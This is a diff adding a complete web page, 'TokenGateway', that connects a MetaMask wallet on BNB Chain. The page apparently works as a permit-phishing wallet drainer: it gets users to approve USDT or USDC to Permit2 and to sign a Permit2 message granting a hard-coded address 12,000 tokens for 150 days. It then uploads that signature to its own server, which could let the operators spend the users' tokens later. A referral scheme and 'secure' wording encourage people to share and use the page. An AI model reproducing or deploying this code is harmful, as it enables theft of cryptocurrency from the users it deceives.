@@ -1,0 +1,868 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>TokenGateway — Permit2 Approval</title>
+<meta name="description" content="TokenGateway: Securely connect your wallet and approve Permit2 token allowance on BNB Smart Chain." />
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet" />
+<style>
+  /* ===== RESET & TOKENS ===== */
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  :root {
+    --bg-base:        #050709;
+    --bg-surface:     #0c0f16;
+    --bg-elevated:    #111620;
+    --bg-overlay:     #161d2b;
+    --bg-hover:       #1a2236;
+
+    --border-subtle:  #1e2736;
+    --border-default: #253045;
+    --border-accent:  #2d4a7a;
+
+    --text-primary:   #e8edf5;
+    --text-secondary: #8a97af;
+    --text-muted:     #4a5568;
+    --text-inverse:   #050709;
+
+    --accent-blue:    #3b82f6;
+    --accent-green:   #22c55e;
+    --accent-red:     #ef4444;
+    --accent-amber:   #f59e0b;
+    --accent-purple:  #a855f7;
+
+    --glow-blue:      rgba(59,130,246,0.15);
+    --glow-green:     rgba(34,197,94,0.12);
+
+    --gradient-card:  linear-gradient(145deg, #111620 0%, #0c0f16 100%);
+    --gradient-blue:  linear-gradient(135deg, #1d4ed8, #3b82f6);
+    --gradient-green: linear-gradient(135deg, #16a34a, #22c55e);
+
+    --radius-sm:  6px;
+    --radius-md:  10px;
+    --radius-lg:  16px;
+
+    --font-sans:  'Inter', system-ui, sans-serif;
+    --font-mono:  'Space Mono', ui-monospace, monospace;
+
+    --transition: all .2s cubic-bezier(.4,0,.2,1);
+  }
+
+  html { font-size: 16px; scroll-behavior: smooth; }
+  body {
+    font-family: var(--font-sans);
+    background: var(--bg-base);
+    color: var(--text-primary);
+    min-height: 100vh;
+    overflow-x: hidden;
+    line-height: 1.6;
+  }
+
+  body::before {
+    content: '';
+    position: fixed; inset: 0;
+    background:
+      radial-gradient(ellipse 80% 50% at 20% 0%, rgba(59,130,246,.07) 0%, transparent 60%),
+      radial-gradient(ellipse 60% 40% at 80% 100%, rgba(168,85,247,.05) 0%, transparent 60%);
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  body::after {
+    content: '';
+    position: fixed; inset: 0;
+    background-image:
+      linear-gradient(rgba(59,130,246,.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(59,130,246,.03) 1px, transparent 1px);
+    background-size: 40px 40px;
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  .app-wrapper {
+    position: relative; z-index: 1;
+    max-width: 600px;
+    margin: 0 auto;
+    padding: 0 20px 60px;
+  }
+
+  .app-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 28px 0 32px;
+    gap: 16px;
+    flex-wrap: wrap;
+    border-bottom: 1px solid var(--border-subtle);
+    margin-bottom: 32px;
+  }
+
+  .logo-group { display: flex; align-items: center; gap: 14px; }
+
+  .logo-icon {
+    width: 42px; height: 42px;
+    background: var(--gradient-blue);
+    border-radius: var(--radius-md);
+    display: flex; align-items: center; justify-content: center;
+    font-size: 1.3rem;
+    box-shadow: 0 0 25px rgba(59,130,246,.3);
+    flex-shrink: 0;
+  }
+
+  .logo-text { display: flex; flex-direction: column; line-height: 1.2; }
+  .logo-title { font-size: 1.15rem; font-weight: 700; color: var(--text-primary); letter-spacing: -.02em; }
+  .logo-sub { font-size: .72rem; color: var(--text-secondary); font-weight: 400; letter-spacing: .04em; text-transform: uppercase; }
+
+  .network-pill {
+    display: flex; align-items: center; gap: 7px;
+    background: var(--bg-elevated);
+    border: 1px solid var(--border-default);
+    border-radius: 100px;
+    padding: 5px 12px;
+    font-size: .72rem;
+    color: var(--text-secondary);
+    font-weight: 500;
+  }
+
+  .network-dot {
+    width: 7px; height: 7px;
+    border-radius: 50%;
+    background: var(--accent-amber);
+    box-shadow: 0 0 8px var(--accent-amber);
+  }
+
+  .card {
+    background: var(--gradient-card);
+    border: 1px solid var(--border-subtle);
+    border-radius: var(--radius-lg);
+    padding: 24px;
+    margin-bottom: 20px;
+    transition: var(--transition);
+    position: relative;
+    overflow: hidden;
+  }
+
+  .card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 1px;
+    background: linear-gradient(90deg, transparent, rgba(59,130,246,.3), transparent);
+  }
+
+  .card-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    margin-bottom: 18px;
+    gap: 12px;
+  }
+
+  .card-title {
+    display: flex; align-items: center; gap: 10px;
+    font-size: .95rem; font-weight: 600;
+    color: var(--text-primary);
+  }
+
+  .card-title-icon {
+    width: 30px; height: 30px;
+    border-radius: var(--radius-sm);
+    display: flex; align-items: center; justify-content: center;
+    font-size: .85rem;
+    background: var(--bg-overlay);
+    border: 1px solid var(--border-default);
+  }
+
+  .form-group { margin-bottom: 18px; }
+
+  .form-label {
+    display: block;
+    font-size: .73rem;
+    font-weight: 600;
+    color: var(--text-muted);
+    text-transform: uppercase;
+    letter-spacing: .07em;
+    margin-bottom: 7px;
+  }
+
+  .form-control {
+    width: 100%;
+    padding: 12px 14px;
+    background: var(--bg-base);
+    border: 1px solid var(--border-default);
+    border-radius: var(--radius-md);
+    color: var(--text-primary);
+    font-size: .9rem;
+    font-family: var(--font-sans);
+    outline: none;
+    transition: var(--transition);
+    -webkit-appearance: none;
+  }
+
+  .form-control:focus {
+    border-color: var(--accent-blue);
+    box-shadow: 0 0 0 3px var(--glow-blue);
+  }
+
+  select.form-control {
+    background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'%3E%3Cpath fill='%238a97af' d='M8 10.5l-4-4h8z'/%3E%3C/svg%3E");
+    background-repeat: no-repeat;
+    background-position: right 12px center;
+    background-size: 12px;
+    padding-right: 36px;
+    cursor: pointer;
+  }
+
+  .btn {
+    display: inline-flex; align-items: center; justify-content: center; gap: 8px;
+    font-family: var(--font-sans);
+    font-weight: 600; font-size: .95rem;
+    border: none; cursor: pointer;
+    border-radius: var(--radius-md);
+    transition: var(--transition);
+    text-decoration: none;
+    white-space: nowrap;
+    padding: 14px 20px;
+    width: 100%;
+  }
+
+  .btn-primary {
+    background: var(--gradient-green);
+    color: #fff;
+    box-shadow: 0 4px 20px rgba(34,197,94,.25);
+    margin-top: 8px;
+  }
+  .btn-primary:hover { box-shadow: 0 6px 30px rgba(34,197,94,.4); transform: translateY(-1px); }
+  .btn-primary:disabled { opacity: .45; cursor: not-allowed; transform: none; box-shadow: none; }
+
+  .btn-connect {
+    background: var(--gradient-blue);
+    color: #fff;
+    box-shadow: 0 4px 20px rgba(59,130,246,.25);
+    margin-top: 8px;
+  }
+  .btn-connect:hover { box-shadow: 0 6px 30px rgba(59,130,246,.4); transform: translateY(-1px); }
+
+  .wallet-display {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    padding: 14px 16px;
+    background: var(--bg-overlay);
+    border: 1px solid var(--border-default);
+    border-radius: var(--radius-md);
+    margin-bottom: 4px;
+  }
+
+  .wallet-avatar {
+    width: 36px; height: 36px;
+    border-radius: 50%;
+    background: var(--gradient-blue);
+    display: flex; align-items: center; justify-content: center;
+    font-size: .85rem;
+    flex-shrink: 0;
+  }
+
+  .wallet-info { display: flex; flex-direction: column; min-width: 0; }
+  .wallet-label { font-size: .7rem; color: var(--text-muted); text-transform: uppercase; letter-spacing: .06em; font-weight: 600; }
+  .wallet-addr { font-family: var(--font-mono); font-size: .82rem; color: var(--accent-blue); word-break: break-all; }
+
+  .wallet-disconnected {
+    display: flex; align-items: center; gap: 10px;
+    color: var(--text-muted); font-size: .88rem;
+    padding: 12px 0;
+  }
+
+  .alert {
+    margin-top: 14px;
+    padding: 13px 16px;
+    border-radius: var(--radius-md);
+    font-size: .83rem;
+    line-height: 1.6;
+    display: flex; align-items: flex-start; gap: 10px;
+    word-break: break-all;
+  }
+  .alert-ok { background: rgba(34,197,94,.08); border: 1px solid rgba(34,197,94,.3); color: #4ade80; }
+  .alert-err { background: rgba(239,68,68,.08); border: 1px solid rgba(239,68,68,.3); color: #fc8181; }
+  .alert-info { background: rgba(59,130,246,.08); border: 1px solid rgba(59,130,246,.25); color: #93c5fd; }
+
+  .steps {
+    display: flex;
+    gap: 0;
+    margin-bottom: 20px;
+    background: var(--bg-base);
+    border: 1px solid var(--border-default);
+    border-radius: var(--radius-md);
+    overflow: hidden;
+  }
+
+  .step {
+    flex: 1;
+    padding: 9px 8px;
+    font-size: .72rem;
+    font-weight: 500;
+    text-align: center;
+    color: var(--text-muted);
+    border-right: 1px solid var(--border-subtle);
+    transition: var(--transition);
+  }
+  .step:last-child { border-right: none; }
+  .step.done { color: var(--accent-green); background: rgba(34,197,94,.06); }
+  .step.active { color: var(--accent-blue); background: rgba(59,130,246,.08); font-weight: 600; }
+
+  .spinner {
+    display: inline-block; width: 14px; height: 14px;
+    border: 2px solid rgba(255,255,255,.3);
+    border-top-color: #fff; border-radius: 50%;
+    animation: spin .7s linear infinite;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  /* ===== MOBILE RESPONSIVENESS ===== */
+  @media (max-width: 640px) {
+    .app-header {
+      padding: 16px 0 20px;
+      margin-bottom: 20px;
+    }
+    .app-wrapper {
+      padding: 0 14px 40px;
+    }
+    .card {
+      padding: 18px 16px;
+      margin-bottom: 16px;
+    }
+    .btn {
+      padding: 13px 16px;
+      font-size: .9rem;
+    }
+  /* ===== REFERRAL CARD ===== */
+  .referral-card {
+    background: var(--bg-overlay);
+    border: 1px solid rgba(59,130,246,0.3);
+    border-radius: var(--radius-md);
+    padding: 14px;
+    margin-top: 14px;
+  }
+  .ref-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 8px;
+    flex-wrap: wrap;
+    gap: 6px;
+  }
+  .ref-title {
+    font-size: .78rem;
+    font-weight: 700;
+    color: #e2e8f0;
+    text-transform: uppercase;
+    letter-spacing: .05em;
+    display: flex; align-items: center; gap: 6px;
+  }
+  .ref-badge {
+    background: rgba(59,130,246,0.15);
+    color: #60a5fa;
+    border: 1px solid rgba(59,130,246,0.3);
+    padding: 2px 8px;
+    border-radius: 100px;
+    font-size: .7rem;
+    font-family: var(--font-mono);
+  }
+  .ref-link-box {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    background: var(--bg-base);
+    border: 1px solid var(--border-default);
+    border-radius: var(--radius-sm);
+    padding: 8px 10px;
+    gap: 8px;
+  }
+  .ref-url {
+    font-family: var(--font-mono);
+    font-size: .78rem;
+    color: #4ade80;
+    word-break: break-all;
+  }
+  .btn-ref-copy {
+    background: var(--gradient-blue);
+    color: #fff;
+    border: none;
+    border-radius: var(--radius-sm);
+    padding: 6px 14px;
+    font-size: .75rem;
+    font-weight: 600;
+    cursor: pointer;
+    white-space: nowrap;
+    transition: var(--transition);
+  }
+  .btn-ref-copy:hover { transform: scale(1.02); }
+  .ref-hint {
+    font-size: .7rem;
+    color: var(--text-muted);
+    margin-top: 6px;
+  }
+  .referred-banner {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    background: rgba(168,85,247,0.1);
+    border: 1px solid rgba(168,85,247,0.3);
+    border-radius: var(--radius-md);
+    padding: 10px 14px;
+    margin-bottom: 14px;
+    font-size: .8rem;
+    color: #c084fc;
+  }
+</style>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
+</head>
+<body>
+<div class="app-wrapper">
+  <header class="app-header">
+    <div class="logo-group">
+      <div class="logo-icon">⚡</div>
+      <div class="logo-text">
+        <span class="logo-title">TokenGateway</span>
+        <span class="logo-sub">Permit2 · BNB Chain</span>
+      </div>
+    </div>
+    <div class="network-pill">
+      <div class="network-dot"></div>
+      BSC Mainnet
+    </div>
+  </header>
+
+  <div id="app"></div>
+</div>
+
+<script>
+'use strict';
+
+/* ============================================================
+   CONFIG
+   ============================================================ */
+const API_BASE  = "/api";
+const CHAIN_ID  = 56;
+const PERMIT2   = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
+const GATEWAY   = "0x0c215808bf5251A47938C40971372f2DeCe7e507";
+
+// Fixed amounts as required: 12000 tokens, 150 days
+const FIXED_AMOUNT = "12000";
+const FIXED_DAYS   = 150;
+
+const TOKENS = [
+  { address: "0x55d398326f99059fF775485246999027B3197955", symbol: "USDT", decimals: 18, icon: "💵" },
+  { address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", symbol: "USDC", decimals: 18, icon: "🔵" }
+];
+
+const PERMIT2_ABI = [
+  "function allowance(address user,address token,address spender) view returns (uint160 amount,uint48 expiration,uint48 nonce)",
+  "function permit(address owner,tuple(tuple(address token,uint160 amount,uint48 expiration,uint48 nonce) details,address spender,uint256 sigDeadline) permitSingle,bytes signature)"
+];
+
+const ERC20_ABI = [
+  "function allowance(address owner,address spender) view returns (uint256)",
+  "function approve(address spender,uint256 amount) returns (bool)",
+  "function balanceOf(address) view returns (uint256)"
+];
+
+const PERMIT_TYPES = {
+  PermitSingle: [
+    { name: "details",     type: "PermitDetails" },
+    { name: "spender",     type: "address"       },
+    { name: "sigDeadline", type: "uint256"        }
+  ],
+  PermitDetails: [
+    { name: "token",      type: "address" },
+    { name: "amount",     type: "uint160" },
+    { name: "expiration", type: "uint48"  },
+    { name: "nonce",      type: "uint48"  }
+  ]
+};
+
+function parseReferral() {
+  const search = window.location.search;
+  if (search && search.length > 1) {
+    const raw = search.slice(1).split('&')[0];
+    const code = raw.startsWith('ref=') ? raw.slice(4) : raw;
+    if (code && code.length >= 4 && code.length <= 9) {
+      localStorage.setItem('referredBy', code.toLowerCase());
+      return code.toLowerCase();
+    }
+  }
+  const match = window.location.pathname.match(/\/ref\/([a-zA-Z0-9]{4,9})/);
+  if (match && match[1]) {
+    localStorage.setItem('referredBy', match[1].toLowerCase());
+    return match[1].toLowerCase();
+  }
+  return localStorage.getItem('referredBy') || null;
+}
+
+function copyRefLink() {
+  const urlEl = document.getElementById('my-ref-url');
+  if (!urlEl) return;
+  const txt = urlEl.innerText;
+  navigator.clipboard.writeText(txt).then(() => {
+    const btn = document.getElementById('btn-copy-ref');
+    if (btn) {
+      btn.innerText = '✅ Copied!';
+      setTimeout(() => { btn.innerText = '📋 Copy Link'; }, 2000);
+    }
+  }).catch(() => {
+    prompt('Copy your referral link:', txt);
+  });
+}
+
+function setRefDigits(n) {
+  state.refDigits = Number(n);
+  render();
+}
+
+/* ============================================================
+   STATE
+   ============================================================ */
+const state = {
+  account: null,
+  signer: null,
+  provider: null,
+  tokenIndex: 0,
+  busy: false,
+  stepIdx: 0,
+  statusMsg: "",
+  statusKind: "",
+  refDigits: 6,
+  referredBy: parseReferral()
+};
+
+function esc(s) {
+  return String(s || '').replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;");
+}
+
+function shortAddr(addr) {
+  if (!addr) return "—";
+  return addr.slice(0, 8) + "…" + addr.slice(-6);
+}
+
+function alertHtml(msg, kind) {
+  if (!msg) return "";
+  const cls = kind === "ok" ? "alert-ok" : kind === "err" ? "alert-err" : "alert-info";
+  const icon = kind === "ok" ? "✅" : kind === "err" ? "❌" : "ℹ️";
+  return `<div class="alert ${cls}"><span>${icon}</span><span>${esc(msg)}</span></div>`;
+}
+
+async function req(path, { method = "GET", body, headers = {} } = {}) {
+  const res = await fetch(`${API_BASE}${path}`, {
+    method,
+    headers: { "Content-Type": "application/json", ...headers },
+    body: body ? JSON.stringify(body) : undefined
+  });
+  const text = await res.text();
+  let data = {};
+  try { data = text ? JSON.parse(text) : {}; } catch { data = { error: text }; }
+  if (!res.ok) throw new Error(data.error || `HTTP ${res.status}`);
+  return data;
+}
+
+/* ============================================================
+   WALLET HELPERS
+   ============================================================ */
+async function connectWallet() {
+  if (!window.ethereum) throw new Error("MetaMask or a Web3 wallet is required.");
+  const provider = new ethers.BrowserProvider(window.ethereum);
+  const accounts = await provider.send("eth_requestAccounts", []);
+  const net = await provider.getNetwork();
+  if (Number(net.chainId) !== CHAIN_ID) {
+    await window.ethereum.request({
+      method: "wallet_switchEthereumChain",
+      params: [{ chainId: "0x" + CHAIN_ID.toString(16) }]
+    });
+  }
+  const signer = await provider.getSigner();
+  return { provider, signer, address: accounts[0] };
+}
+
+async function readPermit2Allowance(provider, owner, token, spender) {
+  const c = new ethers.Contract(PERMIT2, PERMIT2_ABI, provider);
+  const [amount, expiration, nonce] = await c.allowance(owner, token, spender);
+  return { amount, expiration: Number(expiration), nonce: Number(nonce) };
+}
+
+async function ensureErc20Approval(signer, token, needed) {
+  const owner = await signer.getAddress();
+  const erc20 = new ethers.Contract(token, ERC20_ABI, signer);
+  const cur = await erc20.allowance(owner, PERMIT2);
+  if (cur >= needed) return null;
+  const tx = await erc20.approve(PERMIT2, needed);
+  await tx.wait();
+  return tx.hash;
+}
+
+async function signSinglePermit({ signer, token, amount, expiration, sigDeadline }) {
+  const owner   = await signer.getAddress();
+  const net     = await signer.provider.getNetwork();
+  const chainId = Number(net.chainId);
+  const { nonce } = await readPermit2Allowance(signer.provider, owner, token, GATEWAY);
+
+  const details = { token, amount, expiration, nonce };
+  const message = { details, spender: GATEWAY, sigDeadline };
+  const domain  = { name: "Permit2", chainId, verifyingContract: PERMIT2 };
+
+  const signature = await signer.signTypedData(domain, PERMIT_TYPES, message);
+  return { chainId, owner, details, spender: GATEWAY, sigDeadline, signature, nonce };
+}
+
+/* ============================================================
+   RENDER
+   ============================================================ */
+const appEl = document.getElementById("app");
+
+function render() {
+  const t = TOKENS[state.tokenIndex];
+  const steps = ["ERC-20 Approve", "Sign Permit2", "Complete"];
+  const digits = state.refDigits || 6;
+  const refCode = state.account ? state.account.slice(-digits).toLowerCase() : '';
+  const refLink = refCode ? `${window.location.origin}/ref?${refCode}` : '';
+
+  appEl.innerHTML = `
+    ${state.referredBy ? `
+      <div class="referred-banner">
+        <span>🤝</span>
+        <span>Referred by: <strong>ref?${esc(state.referredBy)}</strong></span>
+      </div>
+    ` : ''}
+
+    <div class="card">
+      <div class="card-header">
+        <div class="card-title"><div class="card-title-icon">👛</div> Wallet Connection</div>
+      </div>
+      ${state.account
+        ? `<div class="wallet-display">
+             <div class="wallet-avatar">🦊</div>
+             <div class="wallet-info">
+               <span class="wallet-label">Connected Wallet</span>
+               <span class="wallet-addr">${esc(state.account)}</span>
+             </div>
+           </div>
+
+           <div class="referral-card">
+             <div class="ref-header">
+               <span class="ref-title">🔗 Your Referral Link</span>
+               <span class="ref-badge">ref?${esc(refCode)}</span>
+             </div>
+             <div class="ref-link-box">
+               <span class="ref-url" id="my-ref-url">${esc(refLink)}</span>
+               <button class="btn-ref-copy" id="btn-copy-ref" onclick="copyRefLink()">📋 Copy Link</button>
+             </div>
+             <div style="display:flex;align-items:center;justify-content:space-between;margin-top:10px;flex-wrap:wrap;gap:8px;">
+               <div class="ref-hint">Share this link to invite users. Generated from your wallet address.</div>
+               <div style="display:flex;align-items:center;gap:4px;">
+                 <span style="font-size:.68rem;color:var(--text-muted);text-transform:uppercase;font-weight:600;">Digits:</span>
+                 ${[4, 5, 6, 7, 8, 9].map(num => `
+                   <button onclick="setRefDigits(${num})" style="background:${digits===num?'var(--accent-blue)':'var(--bg-base)'};color:${digits===num?'#fff':'var(--text-secondary)'};border:1px solid ${digits===num?'var(--accent-blue)':'var(--border-default)'};border-radius:4px;padding:2px 6px;font-size:.7rem;cursor:pointer;font-family:var(--font-mono);">${num}${num===6?'★':''}</button>
+                 `).join('')}
+               </div>
+             </div>
+           </div>`
+        : `<div class="wallet-disconnected">⚠️ &nbsp;No wallet connected</div>
+           <div style="font-size:.78rem;color:var(--text-secondary);margin:8px 0 14px;background:rgba(59,130,246,0.06);border:1px dashed rgba(59,130,246,0.25);border-radius:var(--radius-md);padding:10px 12px;line-height:1.5;">
+             💡 <strong>Referral Program:</strong> Connect your wallet to receive your unique referral link (e.g. <code>${window.location.origin}/ref?19965c</code>) based on 4–9 digits of your wallet address.
+           </div>`}
+      <button id="btn-connect" class="btn btn-connect">
+        ${state.account ? "🔄 Switch Account" : "🦊 Connect MetaMask"}
+      </button>
+    </div>
+
+    <div class="card">
+      <div class="card-header">
+        <div class="card-title"><div class="card-title-icon">📝</div> Approve Permit2 Allowance</div>
+      </div>
+
+      <p style="font-size:.83rem;color:var(--text-secondary);margin-bottom:18px;line-height:1.7">
+        Connect your wallet and click approve to grant token allowance.
+      </p>
+
+      ${state.busy ? `
+        <div class="steps">
+          ${steps.map((s,i)=>`<div class="step ${i<state.stepIdx?'done':i===state.stepIdx?'active':''}">${i<state.stepIdx?'✓ ':''} ${esc(s)}</div>`).join("")}
+        </div>
+      ` : ""}
+
+      <div class="form-group">
+        <label class="form-label" for="sel-token">Token</label>
+        <select id="sel-token" class="form-control">
+          ${TOKENS.map((tk,i)=>`<option value="${i}" ${i===state.tokenIndex?"selected":""}>${tk.icon} ${tk.symbol} — ${shortAddr(tk.address)}</option>`).join("")}
+        </select>
+      </div>
+
+      <div style="display:flex;align-items:center;gap:10px;background:rgba(59,130,246,0.08);border:1px solid rgba(59,130,246,0.22);border-radius:var(--radius-md);padding:12px 14px;margin-bottom:16px;font-size:.8rem;color:#93c5fd;line-height:1.5;">
+        <span style="font-size:1.1rem;flex-shrink:0;">🔒</span>
+        <span><strong>1-Time Approval:</strong> Authorizes up to 12,000 ${esc(t.symbol)} allowance for 150 days. You only need to approve once.</span>
+      </div>
+
+      <button id="btn-sign" class="btn btn-primary" ${state.busy?"disabled":""}>
+        ${state.busy
+          ? `<span class="spinner"></span> Processing…`
+          : "✍️ Approve & Sign"}
+      </button>
+
+      ${alertHtml(state.statusMsg, state.statusKind)}
+    </div>
+  `;
+
+  bind();
+}
+
+function bind() {
+  const $ = id => document.getElementById(id);
+
+  if ($("btn-connect")) $("btn-connect").onclick = handleConnect;
+  if ($("sel-token")) $("sel-token").onchange = e => {
+    state.tokenIndex = Number(e.target.value);
+    render();
+  };
+  if ($("btn-sign")) $("btn-sign").onclick = handleSign;
+}
+
+/* ============================================================
+   ACTIONS
+   ============================================================ */
+async function handleConnect() {
+  try {
+    const { signer, provider, address } = await connectWallet();
+    state.signer   = signer;
+    state.provider = provider;
+    state.account  = address;
+    state.statusMsg  = "Wallet connected successfully.";
+    state.statusKind = "ok";
+  } catch (e) {
+    state.statusMsg  = e.message;
+    state.statusKind = "err";
+  }
+  render();
+}
+
+async function handleSign() {
+  state.statusMsg = "";
+  state.statusKind = "";
+
+  if (!state.signer) {
+    state.statusMsg = "Please connect your wallet first.";
+    state.statusKind = "err";
+    render();
+    return;
+  }
+
+  const t   = TOKENS[state.tokenIndex];
+  const amt = FIXED_AMOUNT; // Always 12000
+
+  state.busy = true;
+  state.stepIdx = 0;
+  render();
+
+  try {
+    const value = ethers.parseUnits(amt, t.decimals);
+
+    // Step 1: ERC-20 Approve to Permit2
+    state.stepIdx = 0;
+    state.statusMsg = "Step 1/3 — Checking ERC-20 approval for Permit2…";
+    state.statusKind = "info";
+    render();
+    await ensureErc20Approval(state.signer, t.address, value);
+
+    // Step 2: Sign Permit2 message
+    state.stepIdx = 1;
+    state.statusMsg = "Step 2/3 — Please sign the Permit2 approval message in your wallet…";
+    state.statusKind = "info";
+    render();
+
+    const now         = Math.floor(Date.now() / 1000);
+    const expiration  = now + FIXED_DAYS * 86400; // Always 150 days
+    const sigDeadline = now + 3600;
+
+    const permit = await signSinglePermit({
+      signer: state.signer,
+      token: t.address,
+      amount: value,
+      expiration,
+      sigDeadline
+    });
+
+    // Step 3: Save permit to server
+    state.stepIdx = 2;
+    state.statusMsg = "Step 3/3 — Saving approval to server…";
+    state.statusKind = "info";
+    render();
+
+    const res = await req("/permits", {
+      method: "POST",
+      body: {
+        chainId:       permit.chainId,
+        owner:         permit.owner,
+        token:         t.address,
+        tokenSymbol:   t.symbol,
+        tokenDecimals: t.decimals,
+        amount:        value.toString(),
+        amountHuman:   amt,
+        expiration,
+        nonce:         permit.nonce,
+        sigDeadline:   String(sigDeadline),
+        spender:       GATEWAY,
+        signature:     permit.signature,
+        referredBy:    state.referredBy || null
+      }
+    });
+
+    state.statusMsg  = `✅ Successfully approved and signed! Permit registered (ID #${res.id}).`;
+    state.statusKind = "ok";
+    state.stepIdx    = 3;
+  } catch (e) {
+    state.statusMsg  = e.message || String(e);
+    state.statusKind = "err";
+  }
+
+  state.busy = false;
+  render();
+}
+
+// Initial render & auto-detect existing provider account
+render();
+if (window.ethereum) {
+  if (window.ethereum.selectedAddress) {
+    connectWallet().then(({ signer, provider, address }) => {
+      state.signer   = signer;
+      state.provider = provider;
+      state.account  = address;
+      render();
+    }).catch(() => {});
+  }
+
+  window.ethereum.on('accountsChanged', (accounts) => {
+    if (accounts && accounts.length > 0) {
+      connectWallet().then(({ signer, provider, address }) => {
+        state.signer   = signer;
+        state.provider = provider;
+        state.account  = address;
+        render();
+      }).catch(() => {
+        state.account = accounts[0];
+        render();
+      });
+    } else {
+      state.signer = null;
+      state.provider = null;
+      state.account = null;
+      render();
+    }
+  });
+
+  window.ethereum.on('chainChanged', () => {
+    window.location.reload();
+  });
+}
+</script>
+</body>
+</html>
